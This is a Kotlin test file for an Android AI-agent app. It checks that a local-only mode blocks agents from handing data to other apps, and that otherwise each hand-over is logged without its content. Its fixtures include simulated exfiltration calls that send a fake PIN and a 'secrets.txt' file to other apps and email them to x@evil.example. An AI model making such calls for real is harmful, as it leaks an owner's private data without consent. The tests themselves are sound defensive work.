package com.aicontrolcenter.framework.operator

import com.aicontrolcenter.core.GrantId
import com.aicontrolcenter.core.TaskId
import com.aicontrolcenter.core.ToolId
import com.aicontrolcenter.core.activity.ActivityType
import com.aicontrolcenter.core.agents.AgentProfile
import com.aicontrolcenter.core.llm.ToolCallRequest
import com.aicontrolcenter.core.operator.AppActionResult
import com.aicontrolcenter.core.operator.AskResult
import com.aicontrolcenter.core.operator.GrantScope
import com.aicontrolcenter.core.operator.OperatorCapabilities
import com.aicontrolcenter.core.operator.OperatorTools
import com.aicontrolcenter.core.operator.PermissionGrant
import com.aicontrolcenter.core.registry.InstalledAppInfo
import com.aicontrolcenter.core.registry.Locality
import com.aicontrolcenter.core.tools.CapabilityConstraint
import com.aicontrolcenter.framework.operator.OperatorFixture.Companion.json
import com.aicontrolcenter.framework.tools.DefaultToolRegistry
import com.aicontrolcenter.framework.tools.ToolCallEnd
import com.aicontrolcenter.framework.tools.ToolExecutor
import com.aicontrolcenter.testkit.AppCall
import com.aicontrolcenter.testkit.FakeWorkspaceRoot
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.test.TestScope
import kotlinx.coroutines.test.runTest
import kotlinx.coroutines.test.testTimeSource
import org.junit.Test
import kotlin.coroutines.EmptyCoroutineContext
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertIs
import kotlin.test.assertTrue

/**
 * Round 2, B1 (the rest of P6): in local-only mode agents hand nothing to another app, and
 * outside it every hand-over is logged as data leaving, without its content. Built from the
 * verifier's probes `Verify5ScreenProbes.p6_localOnly` and `Verify5LastProbes.p6_exportToANamedApp`:
 * the real executor and broker, an ALWAYS grant of "Prepare messages", the fake app gateway.
 */
@OptIn(ExperimentalCoroutinesApi::class)
class LocalOnlyHandOverTest {
    private val handOvers = listOf("apps.share_text", "workspace.export", "apps.compose_email", "apps.compose_sms", "apps.dial")

    private class World(val b: BrokerFixture, val f: OperatorFixture, val agent: AgentProfile, val executor: ToolExecutor) {
        suspend fun call(name: String, vararg args: Pair<String, Any?>) =
            executor.execute(ToolCallRequest("c_$name", name, json(*args)), b.context(task = "tsk_work", who = agent))
    }

    private suspend fun TestScope.world(localOnly: Boolean): World {
        val b = BrokerFixture(this).setUp()
        b.settings.update { it.copy(localOnlyMode = localOnly) }
        val f = OperatorFixture()
        f.settings = f.settings.copy(localOnlyMode = localOnly)
        f.apps.installed += InstalledAppInfo("org.mozilla.firefox", "Firefox")
        f.apps.installed += InstalledAppInfo("com.example.clouddrive", "Cloud Drive")
        f.put("secrets.txt", "the owner's notes")
        val agent = b.agent.copy(toolIds = b.agent.toolIds + handOvers.map(::ToolId))
        b.agents.upsert(agent)
        b.grants.insert(PermissionGrant(GrantId("grt_c"), agent.id, OperatorCapabilities.APPS_COMPOSE, CapabilityConstraint.None, GrantScope.ALWAYS, grantedAt = 1))
        // The tools as the app wires them: hand-overs are written to the activity log. The workspace reads on the test's
        // own thread, so that the executor's time limit (virtual time) cannot run out while a real thread reads a file.
        val d = f.dependencies
        val logged = OperatorToolDependencies(
            workspace = LocalWorkspace(FakeWorkspaceRoot(f.root), f.clock, io = EmptyCoroutineContext), sharedFolders = d.sharedFolders, folders = d.folders, media = d.media, apps = d.apps, web = d.web,
            screen = d.screen, authorisedApps = d.authorisedApps, settings = d.settings, protectedPackages = d.protectedPackages,
            shell = d.shell, termux = d.termux, clock = d.clock, ownPackage = d.ownPackage, limits = d.limits,
            egress = OperatorEgress.logTo(b.activity),
        )
        val tools = OperatorToolset.create(logged).associateBy { it.spec.id.value }
        val registry = DefaultToolRegistry().also { r -> handOvers.forEach { r.register(tools.getValue(it)) } }
        return World(b, f, agent, ToolExecutor(registry, b.broker, b.activity, b.clock, timeSource = testTimeSource))
    }

    @Test
    fun `B1 - the catalogue marks every hand-over to another app, so the gate refuses it in local-only mode`() {
        for (id in handOvers) assertTrue(OperatorTools.info(ToolId(id))!!.sendsDataOffDevice, id)
    }

    @Test
    fun `B1 - in local-only mode nothing is handed to another app, named or chosen, and the owner is not asked`() = runTest {
        val w = world(localOnly = true)
        val calls = listOf(
            w.call("apps_share_text", "text" to "the owner's notes: PIN 4711", "app" to "org.mozilla.firefox"),
            w.call("apps_share_text", "text" to "the owner's notes: PIN 4711"),
            w.call("workspace_export", "path" to "secrets.txt", "app" to "com.example.clouddrive"),
            w.call("workspace_export", "path" to "secrets.txt"),
            w.call("apps_compose_email", "to" to listOf("x@evil.example"), "subject" to "s", "body" to "the owner's notes"),
            w.call("apps_compose_sms", "number" to "+44 20 7946 0958", "body" to "the owner's notes"),
            w.call("apps_dial", "number" to "+44 20 7946 0958"),
        )
        for (done in calls) {
            assertEquals(ToolCallEnd.DENIED, done.end, "${done.call.name}: ${done.outcome.content}")
            assertTrue("Local-only mode is on" in done.outcome.content, done.outcome.content)
        }
        assertEquals(emptyList<AppCall>(), w.f.apps.calls.toList(), "nothing reached another app")
        assertEquals(0, w.b.allRequests().size, "the gate refuses before any request")
        assertEquals(0, w.b.events(ActivityType.DATA_EGRESS).size)
        // The agent cannot ask for the permission either: every tool that needs it hands something over.
        val asked = DefaultCapabilityRequester(w.b.facts, w.b.requests, w.b.grants, w.b.waiters, w.b.activity, w.b.ids, w.b.clock)
            .ask(w.b.context(who = w.agent), OperatorCapabilities.APPS_COMPOSE, CapabilityConstraint.None, "To send the notes.")
        assertIs<AskResult.Refused>(asked)
        assertTrue("Local-only mode is on" in asked.reason, asked.reason)
    }

    @Test
    fun `B1 - outside local-only mode each hand-over writes one data-leaving entry that names who, where to, what kind and how much, never the content`() = runTest {
        val w = world(localOnly = false)
        val secret = "the owner's notes: PIN 4711"
        val cases = listOf(
            Triple("apps_share_text", arrayOf<Pair<String, Any?>>("text" to secret, "subject" to "My PIN", "app" to "org.mozilla.firefox"), "app:org.mozilla.firefox"),
            Triple("apps_share_text", arrayOf<Pair<String, Any?>>("text" to secret), OperatorEgress.SHARE_SHEET),
            Triple("workspace_export", arrayOf<Pair<String, Any?>>("path" to "secrets.txt", "app" to "com.example.clouddrive"), "app:com.example.clouddrive"),
            Triple("workspace_export", arrayOf<Pair<String, Any?>>("path" to "secrets.txt"), OperatorEgress.SHARE_SHEET),
            Triple("apps_compose_email", arrayOf<Pair<String, Any?>>("to" to listOf("x@evil.example"), "subject" to "My PIN", "body" to secret), "your email app"),
            Triple("apps_compose_sms", arrayOf<Pair<String, Any?>>("number" to "+44 20 7946 0958", "body" to secret), "your messaging app"),
            Triple("apps_dial", arrayOf<Pair<String, Any?>>("number" to "+44 20 7946 0958"), "your phone app"),
        )
        for ((name, args, destination) in cases) {
            val before = w.b.events(ActivityType.DATA_EGRESS).size
            val done = w.call(name, *args)
            assertEquals(ToolCallEnd.OK, done.end, "$name: ${done.outcome.content}")
            val entries = w.b.events(ActivityType.DATA_EGRESS).drop(before)
            assertEquals(1, entries.size, "$name writes exactly one entry: ${entries.map { it.title }}")
            val entry = entries.single()
            assertEquals(w.agent.id, entry.agentId, name)
            assertEquals(TaskId("tsk_work"), entry.taskId, name)
            assertEquals(TaskId("tsk_root"), entry.rootTaskId, name)
            val egress = entry.egress!!
            assertEquals(destination, egress.destinationHost, name)
            assertEquals(Locality.CLOUD, egress.locality, "the receiving app may send it anywhere")
            assertTrue((egress.approxBytes ?: 0) > 0, "$name says how much: ${egress.approxBytes}")
            val written = listOf(entry.title, entry.detail, egress.purpose, entry.data?.toString().orEmpty()).joinToString(" | ")
            for (content in listOf("PIN", "4711", "owner's notes", "evil.example", "7946")) assertFalse(content in written, "$name logs content ($content): $written")
            assertTrue(w.agent.name in entry.detail, "$name names the agent: ${entry.detail}")
        }
        assertEquals("the app you choose in Android's share sheet", OperatorEgress.SHARE_SHEET)
        // What kind and how much, in words.
        val details = w.b.events(ActivityType.DATA_EGRESS).map { it.detail }
        assertTrue("27 characters of text" in details[0] && "Firefox" in details[0], details[0])
        assertTrue("\"secrets.txt\"" in details[2] && "17 bytes" in details[2] && "Cloud Drive" in details[2], details[2])
        assertTrue("an email draft" in details[4] && "1 recipient" in details[4], details[4])
        assertTrue("a text message draft" in details[5], details[5])
        assertTrue("a phone number" in details[6], details[6])
    }

    @Test
    fun `B1 - a hand-over that did not start is not logged, and one Android defers to a notification is`() = runTest {
        val w = world(localOnly = false)
        w.f.apps.nextResult = AppActionResult.Failed("no app can share text")
        assertEquals(ToolCallEnd.FAILED, w.call("apps_share_text", "text" to "hello").end)
        assertEquals(0, w.b.events(ActivityType.DATA_EGRESS).size)
        // From the background the text goes out when the owner taps the notification: logged now, and said so.
        w.f.apps.inBackground = true
        w.call("apps_share_text", "text" to "hello")
        val deferred = w.b.events(ActivityType.DATA_EGRESS).single()
        assertTrue("only if you tap the notification" in deferred.detail, deferred.detail)
    }
}
